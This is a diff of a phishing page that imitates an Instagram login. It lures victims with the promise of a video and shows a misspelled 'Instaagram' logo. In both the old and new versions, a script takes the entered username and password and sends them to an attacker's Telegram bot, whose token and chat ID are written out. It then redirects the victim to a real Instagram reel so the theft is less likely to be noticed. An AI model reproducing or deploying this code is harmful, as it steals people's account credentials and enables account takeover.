@@ -7,93 +7,72 @@
     <meta property="og:title" content="Instagram Video">
     <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
     <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
-    <meta property="og:image:width" content="600">
-    <meta property="og:image:height" content="600">
     <meta property="og:type" content="video.other">
     
     <title>Instagram</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-    
     <style>
-        /* تصميم ملء الشاشة الأبيض النظيف */
-        body, html { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            background-color: #ffffff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            overflow: hidden; 
-        }
-        .main-content { 
-            display: flex; flex-direction: column; align-items: center; 
-            width: 100%; padding-top: 80px; 
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #ffffff; font-family: -apple-system, sans-serif; overflow: hidden; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 70px; }
         
-        /* تصميم الشعار المتموج والمزخرف بالخطأ الإملائي */
-        .brand-wordmark {
-            font-family: 'Billabong', 'serif'; /* يستخدم خط Billabong المزخرف */
-            font-size: 50px; /* حجم كبير وواضح للشعار */
-            font-weight: normal; /* الخط أصلاً متموج فلا يحتاج لثقل */
-            color: #262626;
-            margin-bottom: 50px;
-            letter-spacing: -1.5px; /* تقريب الحروف لبعضها ليشبه اللوجو الحقيقي */
-            -webkit-text-stroke: 1px #262626; /* تجميل الخط */
+        /* حاوية الشعار المرسوم */
+        .logo-svg {
+            width: 180px; 
+            height: auto;
+            margin-bottom: 40px;
+            fill: #262626;
         }
 
-        .login-box { width: 85%; max-width: 350px; }
+        .login-form { width: 85%; max-width: 350px; }
         input { 
-            width: 100%; background: #fafafa; 
-            border: 1px solid #dbdbdb; border-radius: 3px; 
-            padding: 14px; margin-bottom: 10px; 
+            width: 100%; background: #fafafa; border: 1px solid #dbdbdb; 
+            border-radius: 3px; padding: 14px; margin-bottom: 10px; 
             box-sizing: border-box; font-size: 14px; outline: none;
         }
-        input:focus { border: 1px solid #a8a8a8; }
-        
-        .btn-blue { 
-            width: 100%; background-color: #0095f6; color: white; 
-            border: none; border-radius: 8px; padding: 12px; 
-            font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; 
+        .btn-log { 
+            width: 100%; background-color: #0095f6; color: white; border: none; 
+            border-radius: 8px; padding: 12px; font-weight: 600; font-size: 14px; 
+            margin-top: 15px; cursor: pointer; 
         }
+        .divi { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; margin: 30px 0; }
+        .divi::before, .divi::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
+        .divi::before { margin-left: 1.5em; }
+        .divi::after { margin-right: 1.5em; }
         
-        .separator { 
-            display: flex; align-items: center; text-align: center; 
-            color: #8e8e8e; font-size: 13px; margin: 30px 0; 
-        }
-        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .separator::before { margin-left: 1.5em; }
-        .separator::after { margin-right: 1.5em; }
-        
-        .fb-login-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
-        .meta-text { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
+        .fb-lnk { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
+        .meta-f { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
 
-    <div class="main-content">
-        <div class="brand-wordmark">Instaagram</div>
+    <div class="wrapper">
+        <svg class="logo-svg" viewBox="0 0 500 150" xmlns="http://www.w3.org/2000/svg">
+            <text x="50%" y="80%" text-anchor="middle" 
+                  font-family="'Brush Script MT', 'Apple Chancery', cursive" 
+                  font-size="95" font-style="italic">
+                Instaagram
+            </text>
+        </svg>
         
-        <div class="login-box">
+        <div class="login-form">
             <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
             <input type="password" id="p" placeholder="كلمة السر">
-            <button class="btn-blue" onclick="capture()">تسجيل الدخول</button>
+            <button class="btn-log" onclick="go()">تسجيل الدخول</button>
             
-            <div class="separator">أو</div>
-            <a href="#" class="fb-login-link">تسجيل الدخول بحساب Facebook</a>
+            <div class="divi">أو</div>
+            <a href="#" class="fb-lnk">تسجيل الدخول بحساب Facebook</a>
         </div>
     </div>
     
-    <div class="meta-text">من Meta</div>
+    <div class="meta-f">من Meta</div>
 
     <script>
-        function capture() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            if(user && pass) {
-                // إرسال البيانات للتليجرام
-                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📡User: ${user}%0A🔑Pass: ${pass}`);
-                // تحويل للفيديو الأصلي بعد ثانية واحدة (لتقليل الشك)
-                setTimeout(() => { 
-                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; 
-                }, 1000);
+        function go() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(u && p) {
+                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤:${u}%0A🔑:${p}`);
+                setTimeout(() => { window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; }, 1000);
             }
         }
     </script>
